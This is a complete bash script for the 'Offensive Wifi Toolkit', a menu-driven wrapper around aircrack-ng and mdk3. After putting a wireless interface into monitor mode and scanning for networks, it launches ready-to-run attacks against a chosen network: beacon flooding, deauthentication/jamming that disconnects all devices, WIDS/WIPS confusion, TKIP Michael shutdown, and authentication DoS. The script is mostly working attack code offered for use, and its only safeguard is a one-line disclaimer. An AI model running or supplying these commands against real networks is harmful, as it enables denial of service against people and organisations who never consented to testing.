#!/bin/bash
#Offensive Wifi Toolkit (owt) 
#Project start date (Feb. 8 2021)
#Created By Brennan Mccown (clu3bot)
#Version 2.1.3
#GPL v3.0 License
#
#colors vars
LBLUE='\033[1;34m'
LRED='\033[1;31m'
LGREEN='\033[1;35m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NONE='\033[0m'
#

#predifined vars
S=1000
mon=Monitor
man=Managed
version="2.1.3"
language="English"
#user="clu3bot"
github="https://github.com/clu3bot/"
filename="OWT"
creator="Brennan Mccown (clu3bot)"
contactinfo="brennanmccown@protonmail.com"
#
clear
#
ewr() {
    sleep 0.05
    echo -e "$@"
}

check_for_updates () {

ewr "${YELLOW}Checking for updates${NONE}"
while [ "$(git stash --include-untracked | git reset --hard | git pull https://github.com/clu3bot/owt.git > git.txt)" ]; do
ewr "${NONE}[${LRED}Checking for updates to owt tool${NONE}]"
ewr "\n${LBLUE}Please wait..${NONE}"
done;
if grep "Already" git.txt; then
ewr "${LRED}owt is already up to date!${NONE}"
rm -rf git.txt
sleep 0.2
else
ewr "${LRED}owt has been updated. Restart script for changes to take place.${NONE}"
sleep 1
rm -rf git.txt
exit
fi


}

skip_updates () {
  clear
  ewr "${LGREEN}Skipping Updates..${NONE}"
  sleep 0.4

}

check_for_connect () {
if ping -q -c 1 -W 1 8.8.8.8 >/dev/null; then
  check_for_updates
else
  ewr "${LRED}Could not Check for Updates ${NONE}:${RED} No Internet Connection${NONE}"
  sleep 1.5
  ewr "${LGREEN}Skipping Updates..${NONE}"
  sleep 1.7
fi
}

ask_for_updates () {
clear
echo -e "${LGREEN}The script may have updates available\n${LRED}${d}\n${LBLUE}Would you like to check for them now? (Y/N)"
read -r re 
if [[ "$re" == ["yY"]* ]]; then
        check_for_connect;
else
        skip_updates
fi

}

#prints intro 1
intro_1 () {
echo -e "${LRED}
    ███████    █████   ███   █████ ███████████
  ███░░░░░███ ░░███   ░███  ░░███ ░█░░░███░░░█
 ███     ░░███ ░███   ░███   ░███ ░   ░███  ░ 
░███      ░███ ░███   ░███   ░███     ░███    
░███      ░███ ░░███  █████  ███      ░███    
░░███     ███   ░░░█████░█████░       ░███    
 ░░░███████░      ░░███ ░░███         █████   
   ░░░░░░░         ░░░   ░░░         ░░░░░ "  

echo -e "${YELLOW} \n         Offensive Wifi Toolkit (${filename})"
echo -e "${LBLUE}\n     Created by ${creator}"
echo -e "${LBLUE}                 Version ${version}${NONE}"
echo -e "${YELLOW}\n                     ...${NONE} "
sleep 1.5
clear
ask_for_updates
}

#calls intro 1
intro_1

#Sleeps for 1 seconds
sleep 1
clear
#
check_for_root () {

    isroot=$(whoami)

    if [ "$isroot" = "root" ]; then
    check="true"
    else
    check="false"
    fi

}

#print intro 2
intro_2 () {
check_for_root 
ewr  "${LRED}Welcome To Offensive Wifi Toolkit${NONE}\n"
ewr  "${LGREEN}-------------------------------------------------${NONE}"
ewr  "${YELLOW}These tools are meant for use on networks you own\nHack at your own risk\n${NONE}"

if [ "$check" = "true" ]; then
perm="User is root"
else
perm="User is not root"
fi
ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}"
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
ewr "[${LRED}Interface${NONE}] ${LBLUE}${iface}${NONE}"
dn=$(lsb_release -is)
ewr "[${LRED}Distribution${NONE}] ${LBLUE}${dn}${NONE}\n"
ewr "${LGREEN}-------------------------------------------------${NONE}"
ewr "${LBLUE}Check if all necessary packages are installed${NONE}"
read -r -p "Press Enter to Continue.."
}


permissions_prompt () {
check_for_root
if [ "$check" = "false" ]; then
ewr "${LRED}owt requires root permissions!\n${NONE}"
if [ "$check" = "true" ]; then
perm="User is root"
else
perm="User is not root"
fi
ewr "[${LRED}Permission Status${NONE}] ${LBLUE}${perm}${NONE}\n"
ewr "${YELLOW}Restart owt by using ${LRED}sudo bash owt.sh${NONE}"
ewr "\n${RED}Now exiting the script..${NONE}"
sleep 0.8
exit
else
sleep 0.1
fi
}

#checks for dependent packages
check_dependencies () {
permissions_prompt
dependencies=(aircrack-ng mdk3)
for d in "${dependencies[*]}"; do
if [ "$(dpkg-query -W -f='${Status}' $d 2>/dev/null | grep -c "ok installed")" -eq 0 ]; then
	echo -e "${LBLUE}The following packages must be installed for the script to run...\n${LRED}${d}\n${LBLUE}Would you like to install them now? (Y/N)"
read -r r 
if [[ "$r" == ["yY"]* ]]; then
	sudo apt-get install $d;
fi
fi
done
}

#calls check dependencies
check_dependencies

#checks perms
permissions_prompt
#calls intro 2
intro_2
#
clear


ecmonm() {
clear
echo -e "${LGREEN}Putting Device in Monitor Mode${NONE}"
}

ecmanm() {
clear
echo -e "${LGREEN}Putting Device in Managed Mode${NONE}"
}

mode_vars() {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig $iface | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
}

#checks if device is in monitor mode if not prompts the user to put device in monitor mode
check_monitor_mode () {
clear
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        ewr "${LBLUE}This script requires $mon mode, would you like to enable it now? ${LRED}(Y/N)${NONE}"

	read -r re
fi
if [[ "$re" == ["yY"]* ]]; then
        ecmonm &
	ifconfig "$iface" up
	sleep 0.1
	airmon-ng start "$iface"
fi
}
#calls check monitor mode
check_monitor_mode


#puts interface in monitor mode
monitor_mode () {
ecmonm
airmon-ng check kill
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
clear
echo -e "${LRED}Device already in $mon mode ${NONE}"
sleep 0.5
main_menu
else
sudo airmon-ng start "$iface"
clear
echo -e "${LRED}Device now in $mon Mode${NONE}"
main_menu
fi
}

#puts interface in managed mode
managed_mode () {
ecmanm &
service network-manager start
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Managed" ]; then
Mod=Managed
else
Mod=Monitor
fi
if [ "$Mod" == "Managed" ]; then
clear
echo -e "${LRED}Device already in $man mode ${NONE}"
sleep 0.5
main_menu
else
sudo airmon-ng stop "$iface"
fi
clear
echo -e "${LRED}Device now in $man Mode${NONE}"
main_menu
}

#scans for networks in the area then lists them
scan_networks () {
clear
        iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
        mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
        Mod=Monitor
else
        Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -r -p "Press Enter to return to Main Menu"
                main_menu
fi
        scan_animation & 
        
                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ ${S} -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ ${S} -lt 1 ]; do
        echo -e "\n${LBLUE}Select a Network"
        read -r -p "$(tput setaf 7) " S
done
                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -r -p "$(tput setaf 7)Press Enter to Continue.."
clear
        main_menu
}


#about page menu
about_page () {
clear

	ewr "${LRED}About${NONE}"
	ewr "${LGREEN}--------------------------------${NONE}"
	ewr "${YELLOW}Creator${NONE}:${YELLOW}$creator${NONE}"
	ewr "${YELLOW}Github${NONE}:${YELLOW}$github${NONE}"
	ewr "${YELLOW}Language${NONE}:${YELLOW}$language${NONE}"
	ewr "${YELLOW}Version${NONE}:${YELLOW} $version${NONE}"
	ewr "${YELLOW}Filename${NONE}:${YELLOW}$filename${NONE}"
	ewr "${YELLOW}Contact${NONE}:${YELLOW}$contactinfo${NONE}"
	ewr "${LGREEN}--------------------------------${NONE}"
	ewr "${LRED}Press 1 for Main Menu${NONE}"
}

#wifi attacks menu
wifi_attacks_menu () {
clear
mode_vars
check_mode
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "${LGREEN}----------${NONE}[${LBLUE}General${NONE}]${LGREEN}---------\n"
	ewr "${YELLOW}0] Main Menu\n"
	ewr "${LGREEN}-------${NONE}[${LBLUE}Wifi Attacks${NONE}]${LGREEN}-------\n"
	ewr "${YELLOW}1${NONE}] ${YELLOW}Beacon Flood Attack"
	ewr "${YELLOW}2${NONE}] ${YELLOW}Deauth/Jamming Attack"
	ewr "${YELLOW}3${NONE}] ${YELLOW}Basic AP Probe"
	ewr "${YELLOW}4${NONE}] ${YELLOW}WIDS/WIPS Confusion Attack"
	ewr "${YELLOW}5${NONE}] ${YELLOW}Michael Shutdown Exploitation"
        ewr "${YELLOW}6${NONE}] ${YELLOW}Authentication DoS Attack (AP Freeze)\n"
        ewr "${LGREEN}---------------------------${NONE}"
while true; do
echo -e "${LRED}Select an option:${NONE}"
read -r -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     main_menu
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p  "Are you sure? Press Enter.."
     beacon_flood_attack
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     deauth_attack
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     probe_attack
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     confusion_attack
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     michael_shutdown
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE}»${NONE} [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     authentication_dos
     ;;
  *) echo -e "Not an Option"
     wifi_attacks_menu
     ;;
esac
done
}

#beacon flood attack using mdk3
beacon_flood_attack () {
clear
check_mode
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Beacon Flood Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Spamming Network APs${NONE}"
mdk3 "$iface" b -s 250
}

#traps ctrl c 

#airplay deauth attack using mdk3
deauth_attack () {
clear
check_mode
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')

        echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
        sleep 0.5
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Deauth/Jammer Selected${NONE}"
        sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
        sleep 1
        echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Disconnecting all Devices From Networks..${NONE}"
        mdk3 "$iface" d -c 
}

#wids/wips confusion attack using mdk3
confusion_attack () {
clear
check_mode
check_network_name
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}WIDS/WIPS Confusion Commencing.."
mdk3 "$iface" w -c -z -t "$nn"
}

#probe using mdk3
probe_attack () {
clear
check_mode
check_network_name
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}AP Probe Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Probing Network.."
mdk3 "$iface" p -e "$nn"
}


michael_shutdown () {
clear
check_mode
check_network_name
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Exploit Commencing.."
mdk3 "$iface" m -t "$nn" -w 5 -n 100 
}

authentication_dos () {
clear
check_mode
check_network_name
echo -e "${LGREEN}Press [CRTL] C To Stop${NONE}"
sleep 0.5
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}TKIP Selected${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Sending Packets..${NONE}"
sleep 1
echo -e "${NONE}${LGREEN}*${NONE}]${LRED}Authentication DoS Attack Commencing.."
mdk3 "$iface" a -a "$nn" -c -s 400
}

#checks if interface is in monitor mode for variable assignment
check_mode_for_vars () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
}

#checks if interface is in monitor or managed mode /// for tools that require monitor
check_mode () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
sleep 0.1
else
echo -e "${LRED}This tool requires $mon Mode${NONE}"
read -r -p "Press Enter to continue to Main Menu"
main_menu
fi
}

#checks if the network name is assigned
check_network_name () {
if [ -z ${nn+x} ]; then

echo -e "${LBLUE}For this you must select a Network, would you like do do this now? ${LRED}(Y/N)${NONE}"
read -r ra

if [[ "$ra" == ["yY"]* ]]; then
        scan_network_networkname
sleep 0.5
else
clear
echo "Returning to Main Menu.."
sleep 0.8
main_menu
fi

else

sleep 0.1

fi
}

#scan networks specifically for probe and wids/wips confusion
scan_network_networkname () {
clear
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
        Mod=Monitor
else
        Mod=Managed
fi
if [ "$Mod" == "Monitor" ]; then
        sleep 0.1
else
        echo -e "${LRED}This tool requires Monitor Mode${NONE}"
        read -r -p "Press Enter to return to Main Menu"
                main_menu
fi
        scan_animation &
        
                trap 'airmon-ng stop $iface > /dev/null;rm otp-01.csv 2> /dev/null' EXIT
                xterm -e airodump-ng --output-format csv -w otp "$iface" > /dev/null & sleep 10 ; kill $!
        sed -i '1d' otp-01.csv
kill %1
        echo -e "\n\n${LRED}Scan Results${NONE}"
        cut -d "," -f 14 otp-01.csv | nl -n ln -w 6
                while [ "${S}" -gt "$(wc -l otp-01.csv | cut -d " " -f 1)" ] || [ "${S}" -lt 1 ]; do 
        echo -e "\n${LBLUE}Select a Network"
        read -r -p "$(tput setaf 7) " S
done
                nn=$(sed -n "${S}p" < otp-01.csv | cut -d "," -f 14 )
        rm -rf otp-01.csv 2> /dev/null
        echo -e "\n[${LGREEN}${nn}${NONE} ] Selected"
        read -r -p "$(tput setaf 7)Press Enter to Continue.."
clear
}

#animation while scanning networks.
ii="S"
oo="Sc"
pp="Sca"
ll="Scan"
kk="Scann"
jj="Scanni"
hh="Scannin"
gg="Scanning"
ff="Scanning-"
vv="Scanning-N"
bb="Scanning-Ne"
cc="Scanning-Net"
xx="Scanning-Netw"
zz="Scanning-Netwo"
yy="Scanning-Networ"
tt="Scanning-Network"
qq="Scanning-Networks"

s() {
sleep 0.15
clear
}

scan_animation() {
echo -e "[${LBLUE}${ii}${NONE}]" 
s
echo -e "[${LBLUE}${oo}${NONE}]"  
s
echo -e "[${LBLUE}${pp}${NONE}]"  
s
echo -e "[${LBLUE}${ll}${NONE}]"  
s 
echo -e "[${LBLUE}${kk}${NONE}]"  
s
echo -e "[${LBLUE}${jj}${NONE}]"  
s
echo -e "[${LBLUE}${hh}${NONE}]"  
s
echo -e "[${LBLUE}${gg}${NONE}]"  
s
echo -e "[${LBLUE}${ff}${NONE}]"  
s
echo -e "[${LBLUE}${vv}${NONE}]"  
s
echo -e "[${LBLUE}${bb}${NONE}]"  
s
echo -e "[${LBLUE}${cc}${NONE}]"  
s
echo -e "[${LBLUE}${xx}${NONE}]"  
s
echo -e "[${LBLUE}${zz}${NONE}]"  
s
echo -e "[${LBLUE}${yy}${NONE}]"  
s
echo -e "[${LBLUE}${tt}${NONE}]" 
s
echo -e "[${LBLUE}${qq}${NONE}]" 
}

#stops or keeps monitor mode on termination

termination () {
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
if [ "$Mod" == "Managed" ]; then
exit
else
clear
echo -e "${LBLUE}Exiting OWT, would you like to remain in Monitor Mode? ${LRED}(Y/N)${NONE}"
read -r ro
fi
if [[ "$ro" == ["yY"]* ]]; then
exit
else
service network-manager start
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Managed" ]; then
Mod=Managed
else
Mod=Monitor
fi
if [ "$Mod" == "Managed" ]; then
clear
        echo -e "${LRED}Device already in $man mode ${NONE}"
sleep 0.5
main_menu
else
sudo airmon-ng stop "$iface"
fi
clear
exit
fi
}

trap termination EXIT

#prints options menu

main_menu () {
clear
iface=$(airmon-ng | awk 'NR==4' | awk '{print $2}')
mode=$(iwconfig "$iface" | sed -n '/Mode:/s/.*Mode://; s/ .*//p')
if [ "$mode" ==  "Monitor" ]; then
Mod=Monitor
else
Mod=Managed
fi
	ewr "\n${NONE}[${LRED}Interface${NONE}]${LBLUE} ${iface}${NONE}   [${LRED}Mode${NONE}]${LBLUE} ${Mod}${NONE}   [${LRED}Target Network${NONE}]${LBLUE} ${nn}${NONE}\n"
	ewr "\n${NONE}[${LRED}Options${NONE}]\n"
	ewr "${LGREEN}---------${NONE}[${LBLUE}General${NONE}]${LGREEN}----------\n"
	ewr "${YELLOW}0${NONE}] ${YELLOW}Exit"
	ewr "${YELLOW}1${NONE}] ${YELLOW}Main Menu"
	ewr "${YELLOW}2${NONE}] ${YELLOW}Put Device in Monitor Mode"
	ewr "${YELLOW}3${NONE}] ${YELLOW}Put Device in Managed Mode"
	ewr "${YELLOW}4${NONE}] ${YELLOW}Scan Networks\n"
	ewr "${LGREEN}-------${NONE}[${LBLUE}Wifi Attacks${NONE}]${LGREEN}-------\n"
	ewr "${YELLOW}5${NONE}] ${YELLOW}Wifi Attack Menu${NONE}\n"
	ewr "${LGREEN}----------${NONE}[${LBLUE}Other${NONE}]${LGREEN}-----------\n"
	ewr "${YELLOW}6${NONE}] ${YELLOW}About\n"
	ewr "${LGREEN}----------------------------${NONE}"
while true; do
ewr "\n${LRED}Select an option:${NONE}"
read -r -p "$(tput setaf 7)" option
case $option in  

  0) echo -e "\n${NONE}${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
	clear
     exit 0
     ;;
  1) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p  "Are you sure? Press Enter.."
     main_menu
     ;;
  2) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     monitor_mode
     ;;
  3) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     managed_mode 
     ;;
  4) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     scan_networks
     ;;
  5) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     wifi_attacks_menu
     ;;
  6) echo -e "\n${YELLOW}Selected${NONE}» [${YELLOW}$option${NONE}]"
     read -r -p "Are you sure? Press Enter.."
     about_page
     ;;
  *) echo -e "Not an Option"
     main_menu
     ;;
esac
done
}

#prints
clear
main_menu

#functions
OWT () {
intro_1
intro_2
permissions_prompt
check_monitor_mode
check_dependencies
main_menu
monitor_mode
managed_mode
scan_networks
about_page
wifi_attacks_menu
beacon_flood_attack
deauth_attack
confusion_attack
probe_attack
check_mode_for_vars
check_mode
check_network_name
scan_network_networkname
termination
ctrl_c
scan_animation
}

OWT
